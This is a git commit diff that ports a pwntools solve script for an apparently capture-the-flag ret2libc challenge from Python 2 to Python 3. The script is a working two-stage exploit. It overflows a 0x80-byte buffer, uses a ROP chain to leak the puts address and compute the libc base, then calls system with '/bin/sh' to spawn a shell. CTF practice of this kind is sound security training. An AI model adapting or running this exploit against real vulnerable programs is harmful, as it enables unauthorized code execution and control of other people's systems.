8c919305caa9eca88e45134dbbb5f042dbf63b2e
cynaptic <suiseiressha@protonmail.com>
2026-01-27 22:08:49 +0800

    feat: support python3

--- CCUISC/ret2libc/solve.py
+++ CCUISC/ret2libc/solve.py
@@ -1,4 +1,4 @@
-#!/usr/bin/env python2
+#!/usr/bin/env python3
 from pwn import *
 context.arch='amd64'
 #context.log_level='debug'
@@ -16,23 +16,23 @@ else:
 sz=0x80
 
 p.recvline() #stage 1
-payload = '\x00'*(sz+8)
+payload = b'\x00'*(sz+8)
 payload+= p64(0x0000000000401253) # pop rdi; ret
 payload+= p64(e.got['puts'])
 #payload+= p64(e.symbols['puts']) # wrong address which leads to corrupt
 payload+= p64(0x401060)
 payload+= p64(e.symbols['main']) # for stage 2
 p.sendline(payload)
-puts=u64(p.recv(6).ljust(8, '\x00'))
+puts=u64(p.recv(6).ljust(8, b'\x00'))
 base=puts-libc.symbols['puts']
 log.info('puts@libc : {}'.format(hex(puts)))
 log.info('libc base : {}'.format(hex(base)))
 
 p.recvline() # stage 2
-payload = '\x00'*(sz+8)
+payload = b'\x00'*(sz+8)
 payload+= p64(0x0000000000401254) # ret
 payload+= p64(0x0000000000401253) # pop rdi; ret
-payload+= p64(base+libc.search('/bin/sh').next())
+payload+= p64(base+next(libc.search(b'/bin/sh')))
 payload+= p64(base+libc.symbols['system'])
 p.sendline(payload)
 
